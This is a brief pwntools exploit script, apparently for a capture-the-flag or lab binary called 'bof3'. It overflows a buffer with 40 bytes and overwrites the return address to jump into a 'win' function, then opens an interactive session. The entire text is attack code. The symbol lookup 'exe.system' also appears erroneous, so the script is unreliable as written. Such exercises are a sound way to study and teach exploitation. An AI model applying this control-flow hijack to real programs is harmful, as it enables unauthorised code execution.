from pwn import *

exe = ELF("./bof3", checksec=False)
p = process("./bof3")

payload = b"a" * 40 + p64(exe.system['win'] + 5)
p.send(payload)
p.interactive()
